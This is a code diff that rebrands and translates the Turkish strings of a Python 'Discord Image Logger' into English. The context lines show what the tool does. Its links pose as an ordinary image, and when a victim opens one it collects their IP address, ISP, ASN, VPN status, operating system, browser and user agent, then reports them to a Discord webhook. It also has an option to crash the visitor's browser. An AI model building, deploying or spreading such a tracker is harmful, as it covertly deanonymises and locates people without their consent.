@@ -5,7 +5,7 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "oylesine bi image logger"
+__description__ = "Kray ZN image logger"
 __version__ = "v2.0"
 __author__ = "cabdio"
 
@@ -14,7 +14,7 @@ config = {
     "image": "https://www.bing.com/images/search?view=detailV2&ccid=43Z9IeWB&id=61361796522532CBAF066B86263FFE44E56DFA56&thid=OIP.43Z9IeWBXK0n8nBANA5kKQHaEK&mediaurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.e3767d21e5815cad27f27040340e6429%3frik%3dVvpt5UT%252bPyaGaw%26riu%3dhttp%253a%252f%252fhdqwalls.com%252fwallpapers%252fbatman-begins-4k-rn.jpg%26ehk%3dLfNTVJziJUT58WaE8z2cqHsTfqapSxolwENhNybpyt0%253d%26risl%3d1%26pid%3dImgRaw%26r%3d0&exph=2443&expw=4343&q=batman+jpg&FORM=IRPRST&ck=C9B486A4221953A2B4106811A5A598C7&selectedIndex=8&itb=0", 
     "imageArgument": True,
 
-    "username": "CABDIOLOGGER", 
+    "username": "Made by KrayZN", 
     "color": 0x00FFFF,
 
     "crashBrowser": False, 
@@ -61,9 +61,9 @@ def reportError(error):
     "content": "  ",
     "embeds": [
         {
-            "title": "Image Logger - Hata!",
+            "title": "Image Logger - Hooray!",
             "color": config["color"],
-            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
+            "description": f"An error occurred while logging the IP address!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -80,9 +80,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Bağlantı Gönderildi",
+            "title": "Image Logger - KrayZN ",
             "color": config["color"],
-            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An IPLogger link has been sent to a chat!You will be notified when someone clicks on it.\n\n**End Point:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None
@@ -129,9 +129,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "color": config["color"],
             "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**
 
-**Bitiş Noktası:** `{endpoint}`
+**End Point:** `{endpoint}`
             
-**IP Adresi:**
+**IP Adress:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
@@ -144,11 +144,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**Bilgisayar Bilgileri:**
+**Computer Information:**
 > **Operating System:** `{os}`
 > **Browser:** `{browser}`
 
-**Aracı:**
+**User Agent:**
 ```
 {useragent}
 ```""",
